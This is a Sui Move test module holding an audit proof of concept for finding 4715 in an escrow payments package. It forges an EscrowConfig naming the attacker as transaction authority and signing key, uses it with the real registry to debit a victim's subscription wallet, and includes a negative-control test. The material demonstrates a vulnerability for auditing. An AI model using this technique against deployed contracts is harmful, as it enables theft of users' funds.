#[test_only]
/// Audit PoC for finding 4715: EscrowConfig is not bound to PaymentRegistry /
/// NodeRailsWallet, and `config::create_config` is public. An attacker mints a fresh
/// EscrowConfig with themselves as transaction_authority + authorized_noderails_keys,
/// signs a CaptureWalletSubscription message with their own key, then calls
/// `escrow::capture_from_wallet(&real_registry, &fake_config, &mut victim_wallet, ...)`.
///
/// The function never checks `registry.config_id == object::id(config)` nor that the
/// wallet belongs to the same deployment, so the call succeeds and the victim wallet
/// is debited. The captured coin is locked inside the real registry under a record the
/// attacker can later settle to redirect fees / drain via the merchant field.
module noderails_escrow::audit_poc_tests;

use noderails_escrow::config;
use noderails_escrow::escrow;
use noderails_escrow::wallet;
use sui::clock::Clock;
use sui::coin::{Self, Coin};
use sui::event;
use sui::object::{Self, ID};
use std::option;
use sui::sui::SUI;
use sui::test_scenario::{Self as ts};

const VICTIM: address = @0xAAAA;
const MERCHANT: address = @0xBBBB;
const ATTACKER: address = @0xCCCC;
const FEE_RECIPIENT: address = @0xDDDD;

const DEPOSIT: u64 = 5_000_000_000;
const AMOUNT: u64 = 1_000_000_000;
const FEE_BPS: u16 = 200;
const REMAINING_BUDGET: u64 = 5_000_000_000;
const MAX_PER_CHARGE: u64 = 5_000_000_000;
const EXPIRES_AT_MS: u64 = 0xFFFF_FFFF_FFFF_FFFF;

const PAYMENT_INTENT_ID: vector<u8> =
    x"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const TIMELOCKS: vector<u8> =
    x"0000000100000000000000000000000000000000000000140000000a00000000";

const ATTACKER_PK: vector<u8> =
    x"03a107bff3ce10be1d70dd18e74bc09967e4d6309ba50d5f1ddc8664125531b8";
const ATTACKER_SIG: vector<u8> =
    x"e5bdf77b509eb2d625866b8c490c39b3009d0bd378b20f65251b787c7e0fe1cf5d01b3831c40d14dcf27854b89421ddd6f7550029b00839da0e24282862f310a";

#[test]
fun poc_4715_forge_config_and_drain_victim_wallet() {
    // ---- Tx 0: deployer (FEE_RECIPIENT) publishes the REAL config + registries ----
    let mut scenario = ts::begin(FEE_RECIPIENT);
    scenario.create_system_objects(); // shares the Clock
    let legit_keys: vector<vector<u8>> = vector[
        x"0000000000000000000000000000000000000000000000000000000000000001",
    ];
    escrow::initialize(
        FEE_RECIPIENT,
        FEE_RECIPIENT,
        vector[FEE_RECIPIENT],
        legit_keys,
        scenario.ctx(),
    );

    // ---- Tx 1: victim funds a wallet and authorizes a subscription with MERCHANT ----
    scenario.next_tx(VICTIM);
    let mut wallet_reg = scenario.take_shared<wallet::WalletRegistry>();
    let coin = coin::mint_for_testing<SUI>(DEPOSIT, scenario.ctx());
    escrow::wallet_init_subscription<SUI>(
        &mut wallet_reg,
        coin,
        MERCHANT,
        REMAINING_BUDGET,
        MAX_PER_CHARGE,
        EXPIRES_AT_MS,
        scenario.ctx(),
    );
    let opt_id = wallet::wallet_id_for_owner(&wallet_reg, VICTIM);
    let victim_wallet_id = option::destroy_some(opt_id);
    ts::return_shared(wallet_reg);

    // Sanity: the wallet starts with the deposited balance (must check in a later tx since the
    // wallet was just shared during this tx).
    scenario.next_tx(VICTIM);
    let balance_before = read_balance(&scenario, victim_wallet_id);
    assert!(balance_before == DEPOSIT, 100);

    // ---- Tx 2: attacker (ATTACKER) forges a fresh EscrowConfig ----
    scenario.next_tx(ATTACKER);
    let forged_id = {
        let forged = config::create_config(
            ATTACKER, // fee_recipient — attacker collects fees on settle
            ATTACKER, // super_admin
            vector[ATTACKER], // transaction_authorities — attacker is now a "TA"
            vector[ATTACKER_PK], // authorized_noderails_keys — attacker's key
            scenario.ctx(),
        );
        let id = object::id(&forged);
        config::share_config(forged);
        id
    };

    // ---- Tx 3: attacker exploits capture_from_wallet with the forged config ----
    scenario.next_tx(ATTACKER);
    // Pull the forged config, the real registry, and the victim wallet (all shared).
    let fake_cfg = scenario.take_shared_by_id<config::EscrowConfig>(forged_id);
    let mut real_registry = scenario.take_shared<config::PaymentRegistry>();
    let mut victim_wallet = scenario.take_shared_by_id<wallet::NodeRailsWallet>(victim_wallet_id);
    let clock = scenario.take_shared<Clock>();

    let events_before = event::num_events();

    // BUG EXPLOIT: capture_from_wallet accepts independent config/registry/wallet args.
    // It never asserts registry.config_id == object::id(config) nor wallet ownership of the
    // deployment. The forged config passes require_not_paused / is_transaction_authority,
    // the signature verifies under forged.authorized_noderails_keys, and debit_for_capture
    // happily debits the victim wallet.
    escrow::capture_from_wallet<SUI>(
        &mut real_registry,
        &fake_cfg,
        &mut victim_wallet,
        &clock,
        PAYMENT_INTENT_ID,
        MERCHANT,
        VICTIM, // payer must equal wallet.owner — that is the victim, not the attacker
        AMOUNT,
        FEE_BPS,
        TIMELOCKS,
        ATTACKER_SIG,
        ATTACKER_PK,
        scenario.ctx(),
    );

    let events_after = event::num_events();
    assert!(events_after > events_before, 0);
    let captured = event::events_by_type<escrow::PaymentCaptured>();
    assert!(captured.length() == 1, 1);

    // Cleanup shared objects we hold.
    ts::return_shared(real_registry);
    ts::return_shared(victim_wallet);
    ts::return_shared(clock);
    ts::return_shared(fake_cfg);

    // ---- Tx 4: re-read victim balance to prove it was debited ----
    scenario.next_tx(VICTIM);
    let balance_after = read_balance(&scenario, victim_wallet_id);
    assert!(balance_after == DEPOSIT - AMOUNT, 2);

    scenario.end();
}

/// Helper: read the SUI balance held in a wallet via the public subscription_rule_balance.
fun read_balance(scenario: &ts::Scenario, wallet_id: ID): u64 {
    let wallet = ts::take_shared_by_id<wallet::NodeRailsWallet>(scenario, wallet_id);
    let (bal, _budget, _max, _status) =
        wallet::subscription_rule_balance<SUI>(&wallet, MERCHANT);
    ts::return_shared(wallet);
    bal
}

/// Negative control: the attacker's signature against the REAL config (whose authorized key
/// is the all-zeros-except-last-byte placeholder, NOT ATTACKER_PK) must abort. This proves the
/// exploit depends on the forged config — it is NOT a signature-verification bypass on its own.
#[test]
#[expected_failure(abort_code = 103)]
fun poc_4715_negative_control_real_config_rejects_attacker_sig() {
    let mut scenario = ts::begin(FEE_RECIPIENT);
    scenario.create_system_objects();
    let legit_keys: vector<vector<u8>> = vector[
        x"0000000000000000000000000000000000000000000000000000000000000001",
    ];
    escrow::initialize(
        FEE_RECIPIENT,
        FEE_RECIPIENT,
        // The attacker is NOT a transaction_authority on the real config:
        vector[FEE_RECIPIENT],
        legit_keys, // and the attacker's key is NOT in authorized_noderails_keys
        scenario.ctx(),
    );

    // Victim funds a wallet.
    scenario.next_tx(VICTIM);
    let mut wallet_reg = scenario.take_shared<wallet::WalletRegistry>();
    {
        let coin = coin::mint_for_testing<SUI>(DEPOSIT, scenario.ctx());
        escrow::wallet_init_subscription<SUI>(
            &mut wallet_reg,
            coin,
            MERCHANT,
            REMAINING_BUDGET,
            MAX_PER_CHARGE,
            EXPIRES_AT_MS,
            scenario.ctx(),
        );
    };
    let opt_id = wallet::wallet_id_for_owner(&wallet_reg, VICTIM);
    let victim_wallet_id = option::destroy_some(opt_id);
    ts::return_shared(wallet_reg);

    // Attacker attempts the same capture but with the REAL config — must abort.
    scenario.next_tx(ATTACKER);
    {
        let real_cfg = scenario.take_shared<config::EscrowConfig>();
        let mut real_registry = scenario.take_shared<config::PaymentRegistry>();
        let mut victim_wallet =
            scenario.take_shared_by_id<wallet::NodeRailsWallet>(victim_wallet_id);
        let clock = scenario.take_shared<Clock>();

        escrow::capture_from_wallet<SUI>(
            &mut real_registry,
            &real_cfg,
            &mut victim_wallet,
            &clock,
            PAYMENT_INTENT_ID,
            MERCHANT,
            VICTIM,
            AMOUNT,
            FEE_BPS,
            TIMELOCKS,
            ATTACKER_SIG,
            ATTACKER_PK,
            scenario.ctx(),
        );

        ts::return_shared(real_registry);
        ts::return_shared(victim_wallet);
        ts::return_shared(clock);
        ts::return_shared(real_cfg);
    };

    scenario.end();
}
